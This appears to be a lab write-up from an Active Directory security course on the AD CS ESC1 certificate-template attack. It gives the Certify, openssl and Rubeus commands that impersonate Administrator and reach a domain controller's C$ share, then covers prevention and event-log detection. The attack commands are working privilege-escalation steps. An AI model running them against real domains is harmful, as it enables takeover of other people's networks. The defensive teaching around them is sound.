<img width="1374" height="70" alt="image" src="https://github.com/user-attachments/assets/da14e642-9648-48b9-a50a-08f3bf169b8a" /># 🔐 PKI - ESC1

## 📖 Description

After SpectreOps released the research paper Certified Pre-Owned, Active Directory Certificate Services (AD CS) became one of the most favorite attack vectors for threat agents due to many reasons, including:

* Using certificates for authentication has more advantages than regular username/password credentials.
* Most PKI servers were misconfigured/vulnerable to at least one of the eight attacks discovered by SpectreOps (various researchers have discovered more attacks since then).
* There are a plethora of advantages to using certificates and compromising the Certificate Authority (CA):

  * Users and machines certificates are valid for 1+ years.
  * Resetting a user password does not invalidate the certificate. With certificates, it doesn't matter how many times a user changes their password; the certificate will still be valid (unless expired or revoked).
  * Misconfigured templates allow for obtaining a certificate for any user.
  * Compromising the CA's private key results in forging Golden Certificates.

These advantages make certificates the preferred method for long-term persistence. While SpectreOps disclosed eight privilege escalation techniques, we will examine the first, ESC1, to demonstrate how it works. The description of ESC1 is:

> Domain escalation via No Issuance Requirements + Enrollable Client Authentication/Smart Card Logon OID templates + CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT.

---

## 🔴 Attack

To begin with, we will use Certify to scan the environment for vulnerabilities in the PKI infrastructure:

```powershell
PS C:\Users\bob\Downloads> .\Certify.exe find /vulnerable
```

<img width="636" height="874" alt="image" src="https://github.com/user-attachments/assets/66d90777-4941-4d8a-8ccb-0736a03131f2" />

<img width="2785" height="1192" alt="image" src="https://github.com/user-attachments/assets/32aa4161-b80a-4318-b52b-f40c30d4378a" />

When checking the 'Vulnerable Certificate Templates' section from the output of Certify, we will see that a single template with plenty of information about it is listed. We can tell that the name of the CA in the environment is PKI.eagle.local\eagle-PKI-CA, and the vulnerable template is named UserCert. The template is vulnerable because:

* All Domain users can request a certificate on this template.
* The flag CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT is present, allowing the requester to specify the SAN (therefore, any user can request a certificate as any other user in the network, including privileged ones).
* Manager approval is not required (the certificate gets issued immediately after the request without approval).
* The certificate can be used for 'Client Authentication' (we can use it for login/authentication).

To abuse this template, we will use Certify and pass the argument request by specifying the full name of the CA, the name of the vulnerable template, and the name of the user, for example, Administrator:

```powershell
PS C:\Users\bob\Downloads> .\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator
```

<img width="552" height="888" alt="image" src="https://github.com/user-attachments/assets/a64bf2ac-8e4c-4e4f-b337-af7ea03884af" />

<img width="1885" height="1107" alt="image" src="https://github.com/user-attachments/assets/be1c0e39-fdad-43c6-b0a6-3ad83b71ecfa" />

Once the attack finishes, we will obtain a certificate successfully. The command generates a PEM certificate and displays it as base64. We need to convert the PEM certificate to the PFX format by running the command mentioned in the output of Certify (when asked for the password, press Enter without providing one), however, to be on the safe side, let's first execute the below command to avoid bad formatting of the PEM file.

```shellsession
[/htb]$ sed -i 's/\s\s\+/\n/g' cert.pem
```

Then we can execute the openssl command mentioned in the output of Certify.

```shellsession
[/htb]$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

<img width="1172" height="105" alt="image" src="https://github.com/user-attachments/assets/ab3d220a-dae6-45c9-991b-d7de2d76f38b" />

Now that we have the certificate in a usable PFX format (which Rubeus supports), we can request a Kerberos TGT for the account Administrator and authenticate with the certificate:

```powershell
PS C:\Users\bob\Downloads> .\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt
```

<img width="581" height="828" alt="image" src="https://github.com/user-attachments/assets/57aef64b-e7e3-408e-a71f-0384ae84fb12" />

<img width="2599" height="1530" alt="image" src="https://github.com/user-attachments/assets/72c78be2-e40f-4cf2-8586-4d6b3b57b6c4" />

After successful authentication, we will be able to list the content of the C$ share on DC1:

```powershell
PS C:\Users\bob\Downloads> dir \\dc1\c$
```

<img width="566" height="289" alt="image" src="https://github.com/user-attachments/assets/78a1f027-cfb1-4415-9891-c944484e4f89" />

<img width="1437" height="549" alt="image" src="https://github.com/user-attachments/assets/41ca7e8d-1971-4443-90a1-feabcb5b7811" />

---

## 🛡️ Prevention

The attack would not be possible if the CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag is not enabled in the certificate template. Another method to thwart this attack is to require CA certificate manager approval before issuing certificates; this will ensure that no certificates on potentially dangerous templates are issued without manual approval (which hopefully correlates that the request originated from a legit user).

Because there are many different privilege escalation techniques, it is highly advised to regularly scan the environment with Certify or other similar tools to find potential PKI issues.

---

## 🔎 Detection

When the CA generates the certificate, two events will be logged, one for the received request and one for the issued certificate, if it succeeds. Those events have the IDs of 4886 and 4887 as shown below:

<img width="972" height="1108" alt="image" src="https://github.com/user-attachments/assets/46c02dd1-7661-4f09-b369-ddf0121ea9b8" />

Unfortunately, we can only tell that Bob requested a certificate from WS001; we cannot know if the request specified the SAN.

The CA contains a list of all issued certificates, so if we look there, we will see the request for certificate ID 36 (the one from the attack scenario above):

The general overview of the GUI tool does not display the SAN either, but we can tell that a certificate was issued via the vulnerable template. If we want to find the SAN information, we'll need to open the certificate itself:

<img width="1374" height="70" alt="image" src="https://github.com/user-attachments/assets/4283a5a4-e057-41c1-8774-15c0f5600b5e" />

There is also the possibility to view that programmatically: the command certutil -view will dump everything on the CA with all of the information about each certificate (this can be massive in a large environment):

<img width="1695" height="968" alt="image" src="https://github.com/user-attachments/assets/a6c0933d-3739-49e1-9962-82be4db0c89c" />

With some scripting, we can automate parsing and discovery of abused vulnerable templates by threat agents.

Finally, if you recall, in the attack, we used the obtained certificate for authentication and obtained a TGT; AD will log this request with the event ID 4768, which will specifically have information about the logon attempt with a certificate:

<img width="1457" height="1028" alt="image" src="https://github.com/user-attachments/assets/eb69a18d-0d8d-4b5b-a10a-04badec8d8ae" />

Note that events 4886 and 4887 will be generated on the machine issuing the certificate rather than the domain controller. If GUI access is not available, we can use PSSession to interact with the PKI machine, and the Get-WinEvent cmdlet to search for the events:

```cmd
C:\Users\bob\Downloads>runas /user:eagle\htb-student powershell

Enter the password for eagle\htb-student:
Attempting to start powershell as user "eagle\htb-student" ...
```

```powershell
PS C:\WINDOWS\system32> New-PSSession PKI
```

🖼️ (image here)

```powershell
PS C:\WINDOWS\system32> Enter-PSSession PKI

[PKI]: PS C:\Users\htb-student\Documents> Get-WINEvent -FilterHashtable @{Logname='Security'; ID='4886'}
```
<img width="584" height="491" alt="image" src="https://github.com/user-attachments/assets/7be8966e-9bce-4b7c-a67f-950adb048556" />


```powershell
[PKI]: PS C:\Users\htb-student\Documents> Get-WINEvent -FilterHashtable @{Logname='Security'; ID='4887'}
```

<img width="596" height="330" alt="image" src="https://github.com/user-attachments/assets/8aef1c8d-22c2-4ea3-9f10-ec9d1ea17531" />

To view the full audit log of the events, we can pipe the output into Format-List , or save the events in an array and check them individually:

```powershell
[pki]: PS C:\Users\htb-student\Documents> $events = Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4886'}
[pki]: PS C:\Users\htb-student\Documents> $events[0] | Format-List -Property *
```

<img width="604" height="736" alt="image" src="https://github.com/user-attachments/assets/fa0d48e0-b274-4da6-ba49-6946df977852" />
